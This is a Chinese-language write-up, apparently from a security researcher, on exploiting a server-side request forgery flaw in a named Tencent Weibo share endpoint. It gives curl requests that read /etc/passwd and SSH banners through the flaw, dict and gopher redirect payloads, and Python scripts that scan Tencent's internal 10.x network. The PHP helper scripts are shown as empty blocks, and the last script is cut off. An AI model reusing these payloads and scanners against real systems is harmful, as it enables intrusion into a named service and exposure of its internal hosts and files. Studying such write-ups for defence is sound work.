原文 by ringzero
## 1. 描述
本文章将概述一些经典的SSRF漏洞利用原理，从Fuzz扫描开放的服务到漏洞的自动化利用，刚好腾讯的这个漏洞点，非常适合做为案例来演示。
### 1.1 漏洞信息
腾讯微博应用 http://share.v.t.qq.com
SSRF利用点，参数: url
http://share.v.t.qq.com/index.php?c=share&a=pageinfo&url=http://wuyun.org
### 1.2 服务端回显
当从ssrf利用点发起一个远程请求，如果url资源存在，且MIME类型为HTML，服务端的脚本会分析出HTML页面内的title、img 等等资源，返回给客户端。如果MIME是其它类型，将直接返回原文
#### 例1 请求远程服务器的22端口，直接回显OpenSSH的banner信息
```
[root@localhost wyssrf]# curl 'http://share.v.t.qq.com/index.php?c=share&a=pageinfo&url=http://fuzz.wuyun.org:22'
{"ret":0,"data":{"type":1,"title":"SSH-2.0-OpenSSH_5.3..."}}
```
#### 例2 请求远程服务器的80端口，回显HEAD和图片资源
```
[root@localhost wyssrf]# curl 'http://share.v.t.qq.com/index.php?c=share&a=pageinfo&url=http://www.baidu.com'
{"ret":0,"data":{"type":2,"pics":["http:\/\/www.baidu.com\/img\/baidu_sylogo1.gif"],"title":"\u767e\u5ea6\u4e00\
\u4e0b\uff0c\u4f60\u5c31\u77e5\u9053"}}
```
#### 例3 请求不存在的服务器或未开放的端口
```
[root@localhost wyssrf]# curl 'http://share.v.t.qq.com/index.php?c=share&a=pageinfo&url=http://fuzz.wuyun.org:8888'
{"ret":1}
```
### 1.3 利用场景
假设 victimsite/index.php 是这样实现的：代码中使用curl请求参数url对应的资源，跟随跳转并返回给客户端
``` php
```
Location 302跳转辅助脚本 [302.php]
``` php
```
### 1.4 服务端支持协议
#### Dict协议 -> dict://fuzz.wuyun.org:8080/helo:dict
`victimsite/index.php?url=attacksite/302.php?s=dict&ip=fuzz.wuyun.org&port=8080&data=helo:dict`
```
[root@(fuzz.wuyun.org)localhost wyssrf]# nc -l -vv 8080
Connection from 113.108.10.15 port 8080 [tcp/webcache] accepted
CLIENT libcurl 7.15.1
helo dict
QUIT
```
#### Gopher协议 -> gopher://fuzz.wuyun.org:8080/gopher
`victimsite/index.php?url=attacksite/302.php?s=gopher&ip=fuzz.wuyun.org&port=8080&data=gopher`
```
[root@localhost wyssrf]# nc -l -vv 8080
Connection from 113.108.10.16 port 8080 [tcp/webcache] accepted
GET /gopher HTTP/1.1
Host: 106.75.199.107:8080
Accept: */*
```
gopher协议：
```
victimsite/index.php?url=gopher%3A%2F%2F106.75.199.107%3A80%2F_GET%2520%2FTst_SsrF.html
%2520HTTP%2F1.1%250d%250aHost%3A%2520106.75.199.107%250d%250aConnection%3A%2520close%250d%250a
Content-Length%3A%25200%250d%250a%250d%250a%250d%250a
```
经过测试发现 Gopher 的以下几点局限性：
* 大部分 PHP 并不会开启 fopen 的 gopher wrapper
* file_get_contents 的 gopher 协议不能 URLencode
* file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败
* PHP 的 curl 默认不 follow 302 跳转
* curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用
下图是各种语言对各种协议的支持情况：
![ssrf3](../pictures/ssrf3.jpg)
#### File协议 -> file:///etc/passwd
这里需要一个辅助脚本[file.php]
``` php
```
服务器请求302跳转，直接读取到服务器本地文件
``` 
[root@localhost wyssrf]# curl 'http://share.v.t.qq.com/index.php?c=share&a=pageinfo&url=http://fuzz.wuyun.org/file.php'
{"ret":0,"data":{"type":1,"title":"root:x:0:0:root:\/root:\/bin\/bash bin:x:1:..."}}
```
#### 综上所述得出结论
从回显结果可以判断服务端的curl为低版本的 7.15.1，支持dict,ftp,gopher,dict, file等协议
```
[root@localhost wyssrf]# curl -V
Protocols: tftp ftp telnet dict gopher ldap ldaps http file https ftps scp sftp
```
## 2. 漏洞利用
鉴于gopher://是一个万金油的服务，这里不对该协议进行利用描述，相关技术大家可以自行Google，本文重点讲解如何探测开放的网络服务和漏洞利用。
### 2.1 对开放的网络服务进行探测
这个漏洞地址是t.qq.com，腾讯微博的，确定内网地址，只需要开启域名穷举即可，比如：
PING demo.t.qq.com (10.133.42.26) ，就大概知道腾讯微博的内网地址
针对固定的10.网络 B段、C段进行遍历探测
``` python
#!/usr/bin/env python
# encoding: utf-8
# email: PI:EMAIL
import requests
import time
import random
port = '80'
# fuzz local C 
for c in xrange(0,255):
    for d in xrange(0,255):
        ip = '10.133.{0}.{1}'.format(c,d)
        payload = 'http://{ip}:{port}/'.format(ip=ip,port=port)
        url = 'http://share.v.t.qq.com/index.php?c=share&a=pageinfo&url={payload}'.format(
            payload=payload)
        # len({"ret":1}) == 9
        if len(requests.get(url).content) != 9:
            print ip, port, 'OPEN', requests.get(url).content
```
随机针对内网10.网段进行探测
``` python
#!/usr/bin/env python
# encoding: utf-8
# email: PI:EMAIL
import requests
import time
import random
port = '80'
# random fuzz local ip
while True:
    ip = '10.{0}.{1}.{2}'.format(random.randint(1, 254),random.randint(1, 254),random.randint(1, 254))